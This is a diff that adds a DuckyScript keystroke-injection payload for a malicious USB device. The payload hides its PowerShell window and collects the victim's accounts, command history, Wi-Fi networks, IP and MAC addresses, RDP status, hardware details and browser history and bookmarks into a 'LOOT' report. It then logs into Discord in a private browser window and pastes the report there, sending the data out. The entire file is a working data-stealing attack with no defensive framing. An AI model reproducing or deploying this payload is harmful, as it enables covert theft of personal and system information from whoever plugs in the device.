@@ -1,0 +1,350 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 2000
+
+STRING $i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
+ENTER
+STRING add-type -name win -member $i -namespace native;
+ENTER
+STRING [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
+ENTER
+STRING $FolderName = "$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm)"
+ENTER
+STRING $FileName = "$FolderName.txt"
+ENTER
+STRING $ZIP = "$FolderName.zip"
+ENTER
+STRING New-Item -Path $env:tmp/$FolderName -ItemType Directory
+ENTER
+STRING tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
+ENTER
+STRING Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
+ENTER
+STRING try {
+ENTER
+STRING $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
+ENTER
+STRING } catch {
+ENTER
+STRING     Write-Error "No name was detected"
+ENTER
+STRING     return $env:UserName
+ENTER
+STRING     -ErrorAction SilentlyContinue
+ENTER
+STRING }
+ENTER
+STRING $fullName = Get-fullName
+ENTER 
+STRING function Get-email {
+ENTER 
+STRING     try {
+ENTER 
+STRING         $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
+ENTER
+STRING         return $email
+ENTER 
+STRING     } catch {
+ENTER
+STRING         Write-Error "An email was not found"
+ENTER
+STRING         return "No Email Detected"
+ENTER 
+STRING         -ErrorAction SilentlyContinue
+ENTER
+STRING     }
+ENTER
+STRING }
+ENTER
+STRING $email = Get-email
+ENTER
+STRING $luser = Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String
+ENTER
+STRING try {
+ENTER 
+STRING     $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
+ENTER
+STRING } catch {
+ENTER
+STRING     $NearbyWifi = "No nearby wifi networks detected"
+ENTER
+STRING }
+ENTER
+STRING try {
+ENTER
+STRING     $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+ENTER
+STRING } catch {
+ENTER
+STRING     $computerPubIP = "Error getting Public IP"
+ENTER
+STRING }
+ENTER
+STRING try {
+ENTER
+STRING     $localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String
+ENTER
+STRING } catch {
+ENTER
+STRING     $localIP = "Error getting local IP"
+ENTER
+STRING }
+ENTER 
+STRING $MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*" | Select Name, MacAddress, Status | Out-String
+ENTER 
+STRING if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
+ENTER
+STRING     $RDP = "RDP is Enabled" 
+ENTER
+STRING } else {
+ENTER
+STRING     $RDP = "RDP is NOT enabled" 
+ENTER
+STRING }
+ENTER
+STRING $computerSystem = Get-CimInstance CIM_ComputerSystem
+ENTER
+STRING $computerName = $computerSystem.Name
+ENTER
+STRING $computerModel = $computerSystem.Model
+ENTER
+STRING $computerManufacturer = $computerSystem.Manufacturer
+ENTER
+STRING $computerBIOS = Get-CimInstance CIM_BIOSElement | Out-String
+ENTER
+STRING $computerOs = (Get-WMIObject win32_operatingsystem) | Select Caption, Version | Out-String
+ENTER
+STRING $computerCpu = Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List | Out-String
+ENTER
+STRING $computerMainboard = Get-WmiObject Win32_BaseBoard | Format-List | Out-String
+ENTER
+STRING $computerRamCapacity = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}  | Out-String
+ENTER
+STRING $computerRam = Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table | Out-String
+ENTER
+STRING function Get-BrowserData {
+ENTER
+STRING     [CmdletBinding()]
+ENTER
+STRING     param (	
+ENTER
+STRING         [Parameter(Position=1, Mandatory=$True)]
+ENTER
+STRING         [string]$Browser,    
+ENTER
+STRING         [Parameter(Position=1, Mandatory=$True)]
+ENTER
+STRING         [string]$DataType 
+ENTER
+STRING     ) 
+ENTER
+ 
+ENTER
+STRING     $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+ENTER
+ 
+ENTER
+STRING     if ($Browser -eq 'chrome' -and $DataType -eq 'history')  { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
+ENTER
+STRING     elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
+ENTER
+STRING     elseif ($Browser -eq 'edge' -and $DataType -eq 'history')  { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History" }
+ENTER
+STRING     elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') { $Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" }
+ENTER
+STRING     elseif ($Browser -eq 'firefox' -and $DataType -eq 'history')  { $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" }
+ENTER
+     
+ENTER
+STRING     $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort -Unique
+ENTER
+STRING     $Value | ForEach-Object {
+ENTER
+STRING         $Key = $_
+ENTER
+STRING        if ($Key -match $Search){
+ENTER
+STRING             New-Object -TypeName PSObject -Property @{
+ENTER
+STRING                 User = $env:UserName
+ENTER
+STRING                 Browser = $Browser
+ENTER
+STRING                 DataType = $DataType
+ENTER
+STRING                 Data = $_
+ENTER
+STRING             }
+ENTER
+STRING         }
+ENTER
+STRING     } 
+ENTER
+STRING }
+ENTER
+STRING $CombinedOutput = @"
+ENTER
+STRING Full Name: $fullName
+ENTER
+STRING Email: $email
+ENTER
+
+ENTER
+STRING User Accounts:
+ENTER
+STRING $luser
+ENTER
+
+ENTER
+STRING Nearby WiFi Networks:
+ENTER
+STRING $NearbyWifi
+ENTER
+ 
+ENTER
+STRING Public IP: $computerPubIP
+ENTER
+STRING Local IP:
+ENTER
+STRING $localIP
+ENTER
+ 
+ENTER
+STRING MAC Addresses:
+ENTER
+STRING $MAC
+ENTER
+
+ENTER
+STRING RDP Status:
+ENTER
+STRING $RDP
+ENTER
+
+ENTER
+STRING Computer Name: $computerName
+ENTER
+STRING Computer Model: $computerModel
+ENTER
+STRING Computer Manufacturer: $computerManufacturer
+ENTER
+ 
+ENTER
+STRING BIOS Information:
+ENTER
+STRING $computerBIOS
+ENTER
+ 
+ENTER
+STRING Operating System Information:
+ENTER
+STRING $computerOs
+ENTER
+ 
+ENTER
+STRING CPU Information:
+ENTER
+STRING $computerCpu
+ENTER
+
+ENTER
+STRING Mainboard Information:
+ENTER
+STRING $computerMainboard
+ENTER
+
+ENTER
+STRING RAM Capacity: $computerRamCapacity
+ENTER
+STRING RAM Information:
+ENTER
+STRING $computerRam
+ENTER
+STRING Browser Data:
+ENTER
+STRING "@ + (Get-BrowserData -Browser "edge" -DataType "history" | Out-String) + @"
+ENTER
+STRING ===============================================
+ENTER
+STRING "@
+ENTER
+STRING (Get-BrowserData -Browser "edge" -DataType "bookmarks" | Out-String) + @"
+ENTER
+STRING ===============================================
+ENTER
+STRING "@
+ENTER
+STRING (Get-BrowserData -Browser "chrome" -DataType "history" | Out-String) + @"
+ENTER
+STRING ===============================================
+ENTER
+STRING "@
+ENTER
+STRING (Get-BrowserData -Browser "chrome" -DataType "bookmarks" | Out-String) + @"
+ENTER
+STRING ===============================================
+ENTER
+STRING "@
+ENTER
+STRING (Get-BrowserData -Browser "firefox" -DataType "history" | Out-String)
+ENTER
+ 
+ENTER
+STRING $Output1 = (Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Format-Table -AutoSize | Out-String).Trim()
+ENTER
+ 
+ENTER
+STRING $CombinedOutput += @"
+ENTER
+STRING ===============================================
+ENTER
+STRING Drivers Information:
+ENTER
+STRING $Output1
+ENTER
+STRING "@
+ENTER
+
+ENTER
+STRING $CombinedOutput | Set-Clipboard
+ENTER
+
+
+
+
+DELAY 2000
+ENTER
+DELAY 1000
+GUI r
+DELAY 2000
+STRING msedge
+DELAY 1000
+ENTER
+DELAY 5000
+CTRL t
+DELAY 1000
+CTRL-SHIFT n
+DELAY 1000
+STRING https://discord.com/login
+DELAY 500 
+ENTER
+DELAY 7000
+STRING you_email@example.com
+ENTER
+DELAY 1000
+STRING your_password
+DELAY 1000
+ENTER
+DELAY 3000
+CTRL-ALT DOWNARROW
+DELAY 2600
+CTRL v
+DELAY 1000
+ENTER
+DELAY 2000
+CTRL w 
+DELAY 300
+CTRL w 
